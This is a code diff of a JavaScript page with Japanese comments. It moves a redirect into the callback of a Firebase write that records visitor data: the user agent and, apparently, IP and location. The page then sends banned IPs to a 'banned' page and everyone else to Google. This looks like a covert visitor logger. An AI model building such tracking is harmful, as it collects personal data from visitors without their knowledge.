@@ -67,21 +67,22 @@
                             userAgent: userAgent
                         };
 
-                        newDataRef.set(userData)
-                            .then(() => {
-                                console.log('データがFirebaseに送信されました。');
-                            })
-                            .catch(error => {
+                        // Use the set method to update the data
+                        newDataRef.set(userData, (error) => {
+                            if (error) {
                                 console.error('データの送信中にエラーが発生しました: ', error);
-                            });
+                            } else {
+                                console.log('データがFirebaseに送信されました。');
+                            }
 
-                        // IPがBANされている場合、BANページにリダイレクト
-                        if (bannedIPs.includes(ip)) {
-                            window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html';
-                        } else {
-                            // IPがBANされていない場合、Googleにリダイレクト
-                            window.location.href = 'https://www.google.com';
-                        }
+                            // IPがBANされている場合、BANページにリダイレクト
+                            if (bannedIPs.includes(ip)) {
+                                window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html';
+                            } else {
+                                // IPがBANされていない場合、Googleにリダイレクト
+                                window.location.href = 'https://www.google.com';
+                            }
+                        });
                     });
                 } else {
                     // ブラウザが位置情報をサポートしていない場合、データを送信せずにリダイレクト
